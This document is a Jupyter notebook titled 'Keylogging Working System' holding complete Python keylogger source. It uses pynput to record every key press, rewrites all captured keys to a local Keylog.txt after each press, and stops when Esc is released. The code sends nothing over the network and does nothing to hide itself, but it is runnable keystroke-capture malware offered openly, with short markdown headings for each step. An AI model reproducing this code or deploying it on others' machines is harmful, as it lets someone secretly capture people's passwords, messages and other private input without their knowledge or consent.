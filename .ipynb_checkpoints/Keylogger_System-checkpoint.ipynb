{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "a29bf0e8",
   "metadata": {},
   "source": [
    "# Keylogging Working System"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a0d5a3cc",
   "metadata": {},
   "source": [
    "## Importing the required modules "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "290c7ae0",
   "metadata": {},
   "outputs": [],
   "source": [
    "import sys\n",
    "sys.path.append('C:\\\\Users\\\\hp\\\\AppData\\\\Local\\\\Programs\\\\Python\\\\Python37\\\\Lib\\\\site-packages') \n",
    "from pynput.keyboard import Key  \n",
    "from pynput.keyboard import Listener  \n",
    "  "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8a4b59b7",
   "metadata": {},
   "source": [
    "## Function appending and storing all the keys to File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "d81ebf78",
   "metadata": {},
   "outputs": [],
   "source": [
    "# creating an empty list to store pressed keys  \n",
    "the_keys = []  \n",
    "# creating a function that defines what to do on each key press  \n",
    "def functionPerKey(key):  \n",
    "# appending each pressed key to a list  \n",
    "    the_keys.append(key)  \n",
    "# writing list to file after each key pressed  \n",
    "    storeKeysToFile(the_keys)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "da435319",
   "metadata": {},
   "source": [
    "## Function to write keys to the log file"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "edf556dd",
   "metadata": {},
   "outputs": [],
   "source": [
    "def storeKeysToFile(keys):  \n",
    "    # creating the keylog.txt file with write mode  \n",
    "    with open('Keylog.txt', 'w') as log:  \n",
    "        # looping through each key present in the list of keys  \n",
    "        for the_key in keys:  \n",
    "            # converting the key to string and removing the quotation marks  \n",
    "            the_key = str(the_key).replace(\"'\", \" \")  \n",
    "            # writing each key to the keylog.txt file  \n",
    "            log.write(\" \"+the_key)  \n",
    "  "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "620ccf6d",
   "metadata": {},
   "source": [
    "## Function to perform operation on each key release"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "9e910bcd",
   "metadata": {},
   "outputs": [],
   "source": [
    " \n",
    "def onEachKeyRelease(the_key):  \n",
    "    # In case, the key is \"Esc\" then stopping the keylogger  \n",
    "    if the_key == Key.esc:  \n",
    "        return False  \n",
    "\n",
    "    \n",
    "with Listener(  \n",
    "    on_press = functionPerKey,  \n",
    "    on_release = onEachKeyRelease  \n",
    ") as the_listener:  \n",
    "    the_listener.join()  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f1a61bfe",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
